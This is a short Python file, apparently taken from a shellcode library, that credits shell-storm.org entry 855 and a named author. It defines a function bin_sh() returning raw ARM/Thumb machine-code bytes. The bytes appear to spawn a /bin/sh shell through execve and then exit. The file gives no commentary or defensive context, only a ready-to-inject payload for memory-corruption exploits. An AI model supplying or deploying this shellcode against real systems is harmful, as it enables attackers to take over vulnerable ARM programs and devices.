#http://shell-storm.org/shellcode/files/shellcode-855.php
#Author : gunslinger_ (yuda at cr0security dot com)

def bin_sh():
	shellcode =  r"\x01\x60\x8f\xe2"
	shellcode += r"\x16\xff\x2f\xe1"
	shellcode += r"\x40\x40"
	shellcode += r"\x78\x44"
	shellcode += r"\x0c\x30"
	shellcode += r"\x49\x40"
	shellcode += r"\x52\x40"
	shellcode += r"\x0b\x27"
	shellcode += r"\x01\xdf"
	shellcode += r"\x01\x27"
	shellcode += r"\x01\xdf"
	shellcode += r"\x2f\x2f"
	shellcode += r"\x62\x69\x6e\x2f"
	shellcode += r"\x2f\x73"
	shellcode += r"\x68"
	return shellcode
